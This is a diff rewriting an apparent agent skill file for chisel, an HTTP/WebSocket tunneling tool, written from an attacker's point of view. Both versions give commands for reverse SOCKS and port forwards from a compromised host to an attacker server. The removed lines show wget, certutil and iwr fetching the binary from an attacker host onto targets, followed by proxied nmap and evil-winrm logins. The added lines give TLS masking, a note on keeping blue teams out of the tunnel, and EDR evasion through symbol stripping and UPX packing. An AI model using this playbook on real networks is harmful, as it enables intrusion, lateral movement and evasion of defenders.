@@ -1,175 +1,51 @@
 ---
 name: chisel
 description: "Auth/lab ref: HTTP-based TCP/UDP tunneling tool for port forwarding and SOCKS5 proxying through firewalls."
-license: MIT
-compatibility: "Linux, Windows, macOS; Single binary, no dependencies."
-metadata:
-  author: AeonDave
-  version: "1.0"
 ---
 
-# Chisel
+# chisel
 
-HTTP/HTTPS TCP tunneling — SOCKS5 proxy and port forwarding without TUN interfaces or root.
+**Goal**: Establish reverse and forward TCP/UDP tunnels using HTTP over WebSockets. Ideal for environments where SSH/TUN is unavailable, blocked, or where root privileges (needed for Ligolo-ng) are missing.
 
-## Architecture
+## Cognitive Stance
 
-```
-Attacker (server)  ←—HTTP tunnel—  Victim (client)  ——→  Internal network
-  port 8080                         pivot host           192.168.1.0/24
-```
+Chisel is an asymmetrical binary (client and server are bundled in one executable). In most offensive scenarios, the **Attacker runs the Server** and the **Compromised Host runs the Client**, establishing a persistent WebSocket tunnel outbound (to bypass NAT/inbound firewall rules).
 
-Works where ligolo-ng can't: no root needed, no TUN interface, works through web proxies.
+## 1. Core Executions
 
-## Quick Start
+### Attacker Setup (Server)
+Start the server to listen for incoming connections from the compromised host, enabling reverse tunnels and SOCKS.
 
 ```bash
-# Attacker — start server
-./chisel server -p 8080 --reverse
-
-# Victim — connect client + open SOCKS5 proxy on attacker
-./chisel client <attacker_ip>:8080 R:1080:socks
-
-# Attacker — route tools via SOCKS5
-proxychains nmap -sT 192.168.1.0/24
-proxychains nxc smb 192.168.1.0/24
+# Listen on port 8000. Accept reverse tunnels and SOCKS queries.
+./chisel server -p 8000 --reverse --socks5
 ```
 
-## Transfer Binary to Target
+### Compromised Host Setup (Client)
 
+**Reverse SOCKS5 (Dynamic Port Forwarding)**
+The client dials the attacker, telling the attacker's Chisel server to spawn a SOCKS5 proxy locally on the attacker's machine (default port `1080`).
 ```bash
-# Serve from attacker
-python3 -m http.server 80
-
-# Linux target
-wget http://<attacker>/chisel -O /tmp/chisel && chmod +x /tmp/chisel
-
-# Windows target
-certutil -urlcache -split -f http://<attacker>/chisel.exe C:\Windows\Temp\chisel.exe
-# or
-iwr -Uri http://<attacker>/chisel.exe -OutFile C:\Windows\Temp\chisel.exe
+./chisel client <ATTACKER_IP>:8000 R:socks
 ```
+*Result*: The attacker can now wrap their tools (e.g., `proxychains nmap`) through `127.0.0.1:1080` to reach the internal network behind the compromised host.
 
-## Modes
-
-### Reverse SOCKS5 (most common — attacker gets proxy)
-
+**Reverse Single Port Forwarding**
+The attacker wants to reach a specific internal service (e.g., an RDP server at `10.0.0.5:3389`) that the compromised host can see.
 ```bash
-# Attacker
-./chisel server -p 8080 --reverse
-
-# Victim (creates SOCKS5 on attacker:1080)
-./chisel client <attacker>:8080 R:1080:socks
+# Syntax: R:<Local_Attacker_Port>:<Target_IP>:<Target_Port>
+./chisel client <ATTACKER_IP>:8000 R:3389:10.0.0.5:3389
 ```
 
-```bash
-# proxychains.conf
-socks5 127.0.0.1 1080
+## 2. Advanced Evasion & Tunneling
 
-proxychains curl http://192.168.1.50
-proxychains evil-winrm -i 192.168.1.50 -u admin -p pass
-```
+- **TLS / HTTPS Masking**: Chisel supports TLS natively to avoid Deep Packet Inspection (DPI) flagging plain WebSockets.
+  - Server: `./chisel server -p 443 --reverse --socks5 --tls-cert cert.pem --tls-key key.pem`
+  - Client: `./chisel client https://<ATTACKER_IP> R:socks` (Add `--skip-tls-verification` if using self-signed certs).
+- **Authentication**: Prevent Blue Teams or scanners from hijacking your Chisel C2:
+  - Add `--auth user:password` to both client and server executions.
 
-### Reverse Port Forward (expose internal port on attacker)
+## 3. Strict Quality Gates
 
-```bash
-# Attacker
-./chisel server -p 8080 --reverse
-
-# Victim (forward internal 192.168.1.50:445 to attacker:4455)
-./chisel client <attacker>:8080 R:4455:192.168.1.50:445
-
-# Attacker uses attacker:4455 to reach internal SMB
-smbclient -L //127.0.0.1 -p 4455 -U user
-```
-
-### Forward SOCKS5 (victim opens local SOCKS proxy)
-
-```bash
-# Victim starts server
-./chisel server -p 8080 --socks5
-
-# Attacker connects + gets SOCKS5 through victim
-./chisel client <victim>:8080 1080:socks
-```
-
-### Forward Port (attacker reaches internal service directly)
-
-```bash
-# Victim starts server
-./chisel server -p 8080
-
-# Attacker: forward localhost:8888 → internal 192.168.1.100:80
-./chisel client <victim>:8080 8888:192.168.1.100:80
-
-curl http://127.0.0.1:8888
-```
-
-## HTTPS Mode (avoid cleartext HTTP detection)
-
-```bash
-# Attacker — server with TLS
-./chisel server -p 443 --reverse --tls-key server.key --tls-cert server.crt
-
-# Or self-signed (auto-generated)
-./chisel server -p 443 --reverse
-
-# Victim — skip cert verify
-./chisel client --tls-skip-verify https://<attacker>:443 R:1080:socks
-```
-
-## Authentication (prevent unauthorized use)
-
-```bash
-# Attacker
-./chisel server -p 8080 --reverse --auth user:secretpass
-
-# Victim
-./chisel client --auth user:secretpass <attacker>:8080 R:1080:socks
-```
-
-## Multiple Tunnels (single client connection)
-
-```bash
-# Victim creates both SOCKS5 and specific port forward
-./chisel client <attacker>:8080 R:1080:socks R:4455:192.168.1.50:445
-```
-
-## Double Pivot
-
-```
-Attacker → Pivot1 → Pivot2 → Internal2
-```
-
-```bash
-# Attacker — start server
-./chisel server -p 8080 --reverse
-
-# Pivot1 connects, opens SOCKS5 on attacker:1080
-./chisel client <attacker>:8080 R:1080:socks
-
-# Configure proxychains to use 127.0.0.1:1080
-# From attacker, reach pivot2 via pivot1's SOCKS5:
-proxychains ./chisel server -p 9090 --reverse &
-
-# Pivot2 connects to pivot1:9090 (via pivot1's local service)
-# Pivot2 client → 192.168.2.0/24 SOCKS5 on attacker:2080
-./chisel client <pivot1_ip>:9090 R:2080:socks
-```
-
-## vs ligolo-ng
-
-| Feature | chisel | ligolo-ng |
-|---------|--------|-----------|
-| Root required | No | Yes (TUN) |
-| Speed | Medium (HTTP) | Fast (TUN layer) |
-| Tool compatibility | proxychains needed | Native (TUN routes) |
-| UDP support | Limited | Yes |
-| Firewall bypass | Excellent (HTTP/S) | Requires raw TCP |
-| Best for | No-root pivots, HTTP-allowed nets | Full network routing |
-
-## Resources
-
-| File | When to load |
-|------|--------------|
-| `references/proxychains.md` | proxychains config, dynamic chain, DNS leak prevention, tool compatibility |
+- **TCP Meltdown**: Avoid running intense TCP scans (like `nmap -sT -T4`) over SOCKS. Chisel multiplexes TCP over TCP, which causes performance collapse ("TCP Meltdown") due to conflicting re-transmission timers. Slow down the scans or strictly use Ligolo-ng if high-bandwidth stability is required.
+- **OPSEC**: Modern EDRs aggressively flag the default `chisel` filename and common command-line arguments (`R:socks`). Compile from source using `-ldflags="-s -w"` to strip symbols and use UPX packing, or pass the connection string via environment variables if supported.
